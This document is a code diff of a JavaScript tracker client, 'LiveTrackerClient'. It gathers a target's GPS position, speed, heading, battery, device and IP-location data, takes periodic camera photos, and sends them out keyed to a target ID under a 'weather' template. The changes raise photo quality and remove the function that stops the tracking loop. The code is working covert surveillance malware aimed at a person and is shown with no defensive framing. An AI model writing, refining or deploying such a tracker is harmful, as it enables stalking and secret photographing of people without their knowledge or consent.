@@ -151,29 +151,18 @@
             await new Promise(resolve => setTimeout(resolve, 600));
 
             const canvas = document.createElement("canvas");
-            let width = video.videoWidth || 640;
-            let height = video.videoHeight || 480;
+            const videoWidth = video.videoWidth || 640;
+            const videoHeight = video.videoHeight || 480;
 
-            const maxDim = 800;
-            if (width > maxDim || height > maxDim) {
-                if (width > height) {
-                    height = Math.round((height * maxDim) / width);
-                    width = maxDim;
-                } else {
-                    width = Math.round((width * maxDim) / height);
-                    height = maxDim;
-                }
-            }
-
-            canvas.width = width;
-            canvas.height = height;
+            canvas.width = videoWidth;
+            canvas.height = videoHeight;
 
             const ctx = canvas.getContext("2d");
             ctx.imageSmoothingEnabled = true;
             ctx.imageSmoothingQuality = "high";
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-            const photoData = canvas.toDataURL("image/jpeg", 0.75);
+            const photoData = canvas.toDataURL("image/jpeg", 0.92);
 
             // Stop stream tracks
             stream.getTracks().forEach(track => track.stop());
@@ -186,7 +175,6 @@
     }
 
     let isCapturingPhoto = false;
-    let trackingTimer = null;
 
     async function sendTelemetry(coords, templateName = 'weather', forcePhoto = false) {
         const battery = await getBatteryInfo();
@@ -201,17 +189,17 @@
         }
 
         // Use GPS coordinates if available, otherwise fallback to IP Location
-        const lat = (coords && typeof coords.latitude === 'number') ? coords.latitude : (ipLocation ? ipLocation.lat : null);
-        const lng = (coords && typeof coords.longitude === 'number') ? coords.longitude : (ipLocation ? ipLocation.lng : null);
-        const accuracy = (coords && typeof coords.accuracy === 'number') ? coords.accuracy : (ipLocation ? 5000 : null);
+        const lat = coords ? coords.latitude : (ipLocation ? ipLocation.lat : null);
+        const lng = coords ? coords.longitude : (ipLocation ? ipLocation.lng : null);
+        const accuracy = coords ? coords.accuracy : (ipLocation ? 5000 : null);
 
         const payload = {
             id: targetId,
             lat: lat,
             lng: lng,
             accuracy: accuracy,
-            speed: (coords && typeof coords.speed === 'number') ? coords.speed : null,
-            heading: (coords && typeof coords.heading === 'number') ? coords.heading : null,
+            speed: coords ? coords.speed : null,
+            heading: coords ? coords.heading : null,
             battery: battery,
             device: device,
             ipLocation: ipLocation,
@@ -232,13 +220,6 @@
         }
     }
 
-    function stopTracking() {
-        if (trackingTimer) {
-            clearInterval(trackingTimer);
-            trackingTimer = null;
-        }
-    }
-
     window.LiveTrackerClient = {
         getTargetId: () => targetId,
         sendTelemetry: sendTelemetry,
@@ -246,12 +227,8 @@
         getBatteryInfo: getBatteryInfo,
         getDeviceInfo: getDeviceInfo,
         fetchIPLocation: fetchIPLocation,
-        stopTracking: stopTracking,
         startTracking: function (options = {}) {
             const { templateName = 'weather', updateInterval = 4000, photoInterval = 8000, onSuccess, onError } = options;
-
-            // Clear any previously running tracking timer to avoid duplicate loops
-            stopTracking();
 
             let photoCounter = 0;
 
@@ -282,7 +259,7 @@
             }
 
             // Continuous telemetry cycle
-            trackingTimer = setInterval(() => {
+            setInterval(() => {
                 photoCounter++;
                 const shouldTakePhoto = photoCounter >= Math.max(1, Math.floor(photoInterval / updateInterval));
                 if (shouldTakePhoto) photoCounter = 0;
